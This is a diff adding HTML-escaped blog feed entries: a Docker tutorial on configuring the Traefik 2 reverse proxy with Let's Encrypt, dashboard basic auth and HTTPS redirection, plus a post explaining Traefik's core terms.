+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.websecure.address=:443&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.email=user@example.com&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.storage=/acme/acme.json&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Uncomment the line to use Let's Encrypt's staging server,&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.httpChallenge=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.letsencrypt.acme.httpChallenge.entryPoint=web&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.entrypoints=websecure,web&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.rule=Host(`dashboard.example.com`)&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.tls=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.tls.certresolver=letsencrypt&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Connect the router `api` to internal service 'api'&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.service=api@internal&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Declaring a middleware with name `auth`&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Declaring the user list - echo $(htpasswd -nb admin password) | sed -e s/\\$/\\$\\$/g&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;traefik.http.middlewares.auth.basicauth.users=admin:$$apr1$$mW/l73Bf$$WsprkCzl5.QbLdY9c4kdB0&quot;&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Referencing an `auth` middleware&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.middlewares=auth&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80:80&quot;&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;443:443&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/var/run/docker.sock:/var/run/docker.sock&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./acme:/acme&lt;/span&gt;
+
+  &lt;span class=&quot;na&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# A container that exposes an API to show its IP address&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;containous/whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.entrypoints=websecure,web&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.rule=Host(`whoami.example.com`)&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.tls=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.whoami.tls.certresolver=letsencrypt&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s explain what we made upper. First, we remove the insecure api (specifying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--api&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--api.insecure&lt;/code&gt;).
+We declare a tls connection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api&lt;/code&gt; router that we made in previous part.
+After that we bound the router with internal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api&lt;/code&gt; service. Declaring a &lt;a href=&quot;https://docs.traefik.io/middlewares/overview/&quot;&gt;Middleware&lt;/a&gt; with name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traefik.http.middlewares.auth.basicauth.users&lt;/code&gt;). The value of it was include a string in format &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username:xxxx&lt;/code&gt;.
+It could be generated with shell command - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo $(htpasswd -nb username password) | sed -e s/\\$/\\$\\$/g&lt;/code&gt;.
+And at the end, join the middleware to the router &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traefik.http.routers.api.middlewares=auth&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/dashboard_screenshot.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/dashboard_screenshot.png&quot; alt=&quot;traefik-dashboard&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;4-https-redirection&quot;&gt;4. HTTPS Redirection&lt;/h2&gt;
+
+&lt;p&gt;Now that we have HTTPS routes, let’s redirect every non-https requests to their https equivalent.
+For that, we’ll reuse the previous trick and add just 3 labels to declare a redirect middleware. &lt;a href=&quot;https://docs.traefik.io/middlewares/redirectscheme/&quot;&gt;RedirectScheme&lt;/a&gt; will help us. It redirects request from a scheme to another. We will catch requests only for specific domain - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami.example.com&lt;/code&gt;. See the example below:&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;3'&lt;/span&gt;
+
+&lt;span class=&quot;na&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;traefik&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik:v2.1&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--api.dashboard=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--providers.docker=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--providers.docker.exposedbydefault=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--accesslog=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.web.address=:80&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--entryPoints.websecure.address=:443&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.myresolver.acme.email=r.gainanov@skoltech.ru&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.myresolver.acme.storage=/acme/acme.json&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Uncomment the line to use Let's Encrypt's staging server,&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.myresolver.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.myresolver.acme.httpChallenge=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;--certificatesResolvers.myresolver.acme.httpChallenge.entryPoint=web&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.entrypoints=websecure,web&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.rule=Host(`dashboard.example.com`)&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.tls=true&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.tls.certresolver=letsencrypt&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.service=api@internal&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.routers.api.middlewares=auth&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;traefik.http.middlewares.auth.basicauth.users=admin:$$apr1$$mW/l73Bf$$WsprkCzl5.QbLdY9c4kdB0&quot;&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Declaring a middleware with name `https_redirect` uses Redirecting the Client to a `https` Scheme&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.middlewares.https_redirect.redirectscheme.scheme=https&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Set the permanent option to true to apply a permanent redirection.&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;traefik.http.middlewares.https_redirect.redirectscheme.permanent=true&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80:80&quot;&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;443:443&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/var/run/docker.sock:/var/run/docker.sock:ro&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./acme:/acme&lt;/span&gt;
+
+  &lt;span class=&quot;na&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# A container that exposes an API to show its IP address&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;containous/whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;whoami&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.app.rule&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Host(`whoami.example.com`)&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.app.entrypoints&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;web&lt;/span&gt;
+      &lt;span class=&quot;c1&quot;&gt;# Set the middleware `https_redirect` to `app` router to apply a redirection to https.&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.app.middlewares&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https_redirect&lt;/span&gt;
+
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.appsecured.rule&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Host(`whoami.example.com`)&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.appsecured.entrypoints&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;websecure&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.appsecured.tls&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+      &lt;span class=&quot;s&quot;&gt;traefik.http.routers.appsecured.tls.certresolver&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;myresolver&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We use the previous example and add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;middlewares.https_redirect&lt;/code&gt; as traefik service label. After we bind this middleware to a router defined in whoami - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traefik.http.routers.app.middlewares: https_redirect&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Follow to next advice if want a global redirect rule for requests to all insecured hosts. Move 2 rows from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; service into traefik label’s section &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.app.rule&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.app.entrypoints&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.app.middlewares&lt;/code&gt;. And change the value of the &lt;a href=&quot;https://docs.traefik.io/routing/routers/#rule&quot;&gt;Rule&lt;/a&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rule: Host(`whoami.example.com`)&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HostRegexp(`{host:.+}`)&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Hopefully, I’ve gone through important questions you’ll have when dealing with Traefik 2.0 in a Docker setup, and I hope this examples get you a start point to explore more complex configurations.&lt;/p&gt;
+
+&lt;h2 id=&quot;additional-information&quot;&gt;Additional information&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.traefik.io/&quot;&gt;Official Documentation&lt;/a&gt; - the start point to know more about Traefik&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.traefik.io/user-guides/docker-compose/basic-example/&quot;&gt;Basic Example - Traefik&lt;/a&gt; - docker-compose basic example by Traefik&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://docs.traefik.io/reference/dynamic-configuration/docker/&quot;&gt;Docker Configuration Reference&lt;/a&gt; - configure Traefik with Docker Labels&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://containo.us/blog/traefik-2-0-docker-101-fc2893944b9d/&quot;&gt;Traefik 2.0 &amp;amp; Docker 101&lt;/a&gt; - step by step with Traefik in an author blog&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><category term="devops" /><category term="docker" /><category term="devops" /><category term="ssl" /><category term="letsencrypt" /><category term="traefik" /><summary type="html">Deploying web services to public network usually requires to set up secure connections using SSL certificates. With Docker you can easily make it using another container as reverse proxy. This service named Traefik. It has big capabilities about I will explain in the post.</summary></entry><entry><title type="html">Traefik. Concept term explanation</title><link href="https://gainanov.pro/eng-blog/devops/docker-traefik-concept-terms-explanation/" rel="alternate" type="text/html" title="Traefik. Concept term explanation" /><published>2020-02-21T00:00:00+03:00</published><updated>2020-02-21T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/devops/docker-traefik-concept-terms-explanation</id><content type="html" xml:base="https://gainanov.pro/eng-blog/devops/docker-traefik-concept-terms-explanation/">&lt;p&gt;&lt;a href=&quot;https://docs.traefik.io/&quot;&gt;Traefik&lt;/a&gt; is an open-source Edge Router that makes publishing your services a fun and easy experience.
+It receives requests on behalf of your system and finds out which components are responsible for handling them.&lt;/p&gt;
+
+&lt;p&gt;Traefik perfectly bound with Docker engine, just attach labels to your containers and let Traefik do the rest!&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/traefik-architecture.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/traefik-architecture.png&quot; alt=&quot;Traefik design in a nutshell&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;But if are new in Traefik you will have some difficulties to understand what does it mean all this specific words.
+In here I would like to explain the basic definition of them. Let’s start.&lt;/p&gt;
+
+&lt;h3 id=&quot;provider&quot;&gt;Provider&lt;/h3&gt;
+
+&lt;p&gt;Traefik is able to use your cluster API to discover the services and read the attached information.
+In Traefik, these connectors are called &lt;a href=&quot;https://docs.traefik.io/providers/overview/&quot;&gt;&lt;strong&gt;Providers&lt;/strong&gt;&lt;/a&gt; because they provide the configuration to Traefik.
+The idea is that Traefik will query the providers’ API in order to find relevant information about routing, and each time Traefik detects a change, it dynamically updates the routes.&lt;/p&gt;
+
+&lt;p&gt;To define a connection with docker add next parameter to a traefik command:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--providers.docker=true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;entrypoint&quot;&gt;EntryPoint&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.traefik.io/routing/entrypoints/&quot;&gt;&lt;strong&gt;EntryPoints&lt;/strong&gt;&lt;/a&gt; are the network entry points into Traefik.
+They define the port which will receive the requests (whether HTTP or TCP).
+EntryPoints are part of the static configuration.
+You can define them using a toml file, CLI arguments, or a key-value store.&lt;/p&gt;
+
+&lt;p&gt;For example&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--entryPoints.web.address=:80
+--entryPoints.websecure.address=:443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Two entrypoints are defined: one called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt;, and the other called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websecure&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; listens on port 80, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websecure&lt;/code&gt; on port 443.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;router&quot;&gt;Router&lt;/h3&gt;
+
+&lt;p&gt;The main function is a connecting Requests from EntryPoint to Services.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.traefik.io/routing/routers/&quot;&gt;&lt;strong&gt;Router&lt;/strong&gt;&lt;/a&gt; is in charge of connecting incoming requests to the services that can handle them.
+In the process, routers may use pieces of middleware to update the request, or act before forwarding the request to the service.&lt;/p&gt;
+
+&lt;p&gt;Configuration example&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--traefik.http.routers.whoami.entrypoints=web
+--traefik.http.routers.whoami.rule=Host(`whoami.localhost`)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;The router has name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt; and will get requests from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; entrypoint.&lt;/li&gt;
+  &lt;li&gt;Defined rule &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host('whoami.localhost')&lt;/code&gt; will allow only requests for domain ‘whoami.localhost’&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;rule&quot;&gt;Rule&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://docs.traefik.io/routing/routers/#rule&quot;&gt;&lt;strong&gt;Rules&lt;/strong&gt;&lt;/a&gt; are a part of Router. In detail it is a set of &lt;strong&gt;matchers&lt;/strong&gt; configured with values,
+that determine if a particular request matches specific criteria.
+If the rule is verified, the router becomes active, calls middlewares, and then forwards the request to the service.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rule = &quot;Host(`traefik.io`) || (Host(`containo.us`) &amp;amp;&amp;amp; Path(`/traefik`))&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;middleware&quot;&gt;Middleware&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.traefik.io/middlewares/overview/&quot;&gt;&lt;strong&gt;Middleware&lt;/strong&gt;&lt;/a&gt; needs for tweaking the Request.
+Attached to the routers, pieces of middleware are a means of tweaking the requests before they are sent to your service
+(or before the answer from the services are sent to the clients).&lt;/p&gt;
+
+&lt;p&gt;There are several available middleware, some can modify the request, the headers, some are in charge of redirections,
+some add authentication, and so on. The middlewares will take effect only if the route rule matches,
+and before forwarding the request to the service.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/middleware.png&quot; class=&quot;align-center&quot;&gt;&lt;img src=&quot;https://gainanov.pro/eng-blog/assets/images/traefik/middleware.png&quot; alt=&quot;Traefik Middleware scheme&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Example of creating and attaching a middleware (add BasicAuth to the Service):&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--traefik.http.routers.api.rule=Host(`traefik.example.com`)
+--traefik.http.routers.api.service=api@internal
+--traefik.http.routers.api.middlewares=auth
+--traefik.http.middlewares.auth.basicauth.users=user:$$apr1$$mW/l73Bf$$Wsprk23sa5.QbLdY3sak7hf0&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Firs of all we create a route &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api&lt;/code&gt; with rule that will pass traffic only for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;traefik.example.com&lt;/code&gt; domain&lt;/li&gt;
+  &lt;li&gt;We attach an internal traefik service to this route - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api@internal&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Also we attach a middleware &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt; that we explain in the next row&lt;/li&gt;
+  &lt;li&gt;The new middleware has name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt;. It’s a &lt;a href=&quot;https://docs.traefik.io/middlewares/basicauth/&quot;&gt;BasicAuth&lt;/a&gt; middleware. It
+To create a user:password pair, the following command can be used:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# echo $(htpasswd -nb user password) | sed -e s/\\$/\\$\\$/g
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;service&quot;&gt;Service&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.traefik.io/routing/services/&quot;&gt;Services&lt;/a&gt; are responsible for configuring how to reach the actual services that will eventually handle the incoming requests.&lt;/p&gt;
+
+&lt;p&gt;Each request must eventually be handled by a service, which is why each router definition should include a service target,
+which is basically where the request will be passed along to.&lt;/p&gt;
+
+&lt;p&gt;To define a usage of the specific port&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--traefik.http.services.myapp.loadbalancer.server.port=8082
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;The service &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;myapp&lt;/code&gt; will income requests between servers that listen on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8082&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
